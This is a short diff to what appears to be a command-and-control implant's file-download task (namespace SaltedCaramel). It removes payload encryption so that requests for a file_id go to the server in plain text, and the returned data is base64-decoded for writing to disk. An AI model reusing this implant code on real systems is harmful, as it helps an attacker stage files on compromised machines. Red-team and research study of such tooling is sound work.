@@ -18,10 +18,8 @@ namespace SaltedCaramel.Tasks
             try
             {
                 string payload = "{\"file_id\": \"" + file_id + "\"}";
-                // Encrypt json to send to server
-                string encrypted = implant.crypto.Encrypt(payload);
                 // Get response from server and decrypt
-                string result = implant.crypto.Decrypt(HTTP.Post(fileEndpoint, encrypted));
+                string result = HTTP.Post(fileEndpoint, payload);
                 bytes = Convert.FromBase64String(result);
                 return bytes;
             }
@@ -51,10 +49,8 @@ namespace SaltedCaramel.Tasks
                 try // Try block for HTTP request
                 {
                     string payload = "{\"file_id\": \"" + file_id + "\"}";
-                    // Encrypt json to send to server
-                    string encrypted = implant.crypto.Encrypt(payload);
 
-                    string result = implant.crypto.Decrypt(HTTP.Post(fileEndpoint, encrypted));
+                    string result = HTTP.Post(fileEndpoint, payload);
                     byte[] output = Convert.FromBase64String(result);
                     try // Try block for writing file to disk
                     {
